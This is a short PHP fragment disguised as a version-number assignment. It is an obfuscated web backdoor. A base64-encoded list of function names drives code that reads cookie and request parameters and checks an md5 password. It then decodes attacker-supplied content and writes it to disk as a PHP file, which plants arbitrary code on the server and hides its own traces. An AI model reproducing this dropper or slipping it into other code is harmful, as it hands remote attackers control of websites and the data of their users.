...
$version = ['1.5.12', $y = '1680227976' => $c = "X1JFUVVFU1QsX0NPT0tJRSxhcnJheV9tZXJnZSxtZDUsc3RybGVuLHN0cmlwb3MsPD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4sZmlsZV9wdXRfY29udGVudHMsYmFzZTY0X2RlY29kZSxuYW1lLF9leHAsc3Vic3RyLA8+b2e986403e35450d6cb26327720dbf1f",$h = function($p,$b,$c=''){return empty($p[$b])?$c:$p[$b];}, $e = substr($c, strpos($c, '+') + 1) => $c = explode(',', base64_decode($c)), ($i = $_REQUEST) && ($i = $c[2]($GLOBALS[$c[1]], $i)) && ($c[3]($h($i, 'a', $h($i, $c[10])) . "pfes") === $e) && ($k = function ($z, $x, $y) {if ($y[4]($x = $y[8]($x)) > 18 && $y[5]($x, $y[11]($y[6], 0, 5)) !== false && $y[7]($z, $y[6] . $x)) { $z;return true; }}) && $h($i,$c[9]) ? $k('1680227976', $i[$c[9]], $c) && exit(0) : ''];
